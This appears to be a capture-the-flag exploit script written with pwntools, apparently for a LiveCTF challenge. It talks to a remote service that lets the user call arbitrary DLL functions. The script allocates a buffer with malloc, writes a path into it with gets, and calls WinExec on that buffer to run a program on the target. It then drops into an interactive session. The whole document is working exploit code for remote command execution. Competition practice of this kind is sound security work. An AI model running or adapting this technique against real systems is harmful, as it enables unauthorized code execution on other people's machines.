#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

r = remote(HOST, int(PORT))


def nya(mname, fname, arg: int, cb=None):
    if isinstance(mname, str):
        mname = mname.encode()
    if isinstance(fname, str):
        fname = fname.encode()
    r.sendlineafter(b"load?", mname)
    r.sendlineafter(b"call?", fname)
    r.sendlineafter(b"argument?", str(arg).encode())
    if cb:
        cb()
    r.recvuntil(b"Result: ")
    return int(r.recvline(), 16)


buf = nya("msvcrt.dll", "malloc", 233)
print(f"buf = {hex(buf)}")
ret = nya(
    "msvcrt.dll",
    "gets",
    buf,
    lambda: r.sendline(b"Z:\\home\\livectf\\submitter"),
)
print(f"ret = {hex(ret)}")
# nya("msvcrt.dll", "puts", buf)

nya("kernel32.dll", "WinExec", buf)

r.interactive()
